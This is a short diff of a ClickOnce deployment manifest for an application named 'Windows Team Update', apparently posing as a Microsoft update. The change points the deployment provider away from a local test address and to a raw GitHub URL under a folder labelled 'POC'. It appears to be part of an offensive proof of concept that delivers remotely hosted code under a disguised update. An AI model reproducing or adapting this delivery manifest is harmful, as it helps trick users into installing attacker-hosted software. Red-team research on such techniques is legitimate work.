@@ -3,7 +3,7 @@
   <assemblyIdentity name="Windows Team Update.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="amd64" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Windows Team Update" asmv2:product="Windows Team Update" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false">
-    <deploymentProvider codebase="http://192.168.0.108:8081/TargetApp.application" />
+    <deploymentProvider codebase="https://raw.githubusercontent.com/reveng007/Executable_Files/refs/heads/main/POC/TargetApp.application" />
   </deployment>
   <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
     <framework targetVersion="4.8" profile="Client" supportedRuntime="4.0.30319" />
